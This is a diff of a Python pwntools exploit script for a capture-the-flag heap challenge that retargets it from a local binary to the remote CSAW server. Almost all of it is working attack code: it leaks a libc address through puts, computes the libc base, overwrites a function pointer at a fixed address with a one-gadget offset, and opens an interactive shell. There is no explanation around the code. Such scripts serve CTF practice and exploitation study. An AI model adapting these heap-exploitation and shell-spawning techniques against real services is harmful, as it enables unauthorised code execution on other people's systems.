@@ -2,9 +2,8 @@ from pwn import *
 context.log_level = 'debug'
 context.arch='amd64'
 
-b = ELF("./heap")
-#libc = ELF("./libc-2.27.so")
-libc = ELF("./mylibc.so")
+b = ELF("./worstcodeever")
+libc = ELF("./libc-2.27.so")
 
 def add_human(p, name, age):
     p.sendlineafter("> ", "1")
@@ -39,11 +38,7 @@ def edit_robot(p, index, newid, age):
     p.sendlineafter("age?\n", str(age))
 
 def main():
-    #p = process("./heap", env={"LD_PRELOAD": "./libc-2.27.so"})
-    p = process("./heap")
-    #p = gdb.debug("./heap", "b display", env={"LD_PRELOAD": "./libc-2.27.so"})
-    #p = gdb.debug("./heap", "")
-    #gdb.attach(p, "b system")
+    p = remote("pwn.red.csaw.io", "8000")
 
     add_human(p, "A"*32, 20)
     add_human(p, "B"*32, 20)
@@ -59,29 +54,18 @@ def main():
     libc_base = puts_libc - libc.symbols['puts']
 
     print("Got libc base {:x}".format(libc_base))
-    #oneshot = libc_base + 0x4f2c5
-    #oneshot = libc_base + 0x4f322
-    oneshot = libc_base + 0x10a38c #works locally
-
-    #oneshot = libc_base + 0x4f365
-    #oneshot = libc_base + 0x4f3c2
-    #oneshot = libc_base + 0x10a45c
-
-    #system = libc_base + libc.symbols['system']
+    #oneshot = libc_base + 0x10a38c #works locally
+    oneshot = libc_base + 0x10a45c #remote
 
     remove_friend(p, 4)
 
     add_robot(p, 0x602048, 20)
-    #display(p, 4)
 
-    #print("Calculated system {:x}".format(system))
     print("Calculated oneshot {:x}".format(oneshot))
-    #edit_human(p, 1, p64(system), 20)
     edit_human(p, 1, p64(oneshot), 20)
 
     p.sendlineafter("> ", "4")
     p.sendlineafter("edit?\n", "a")
-
 
     p.interactive()
 
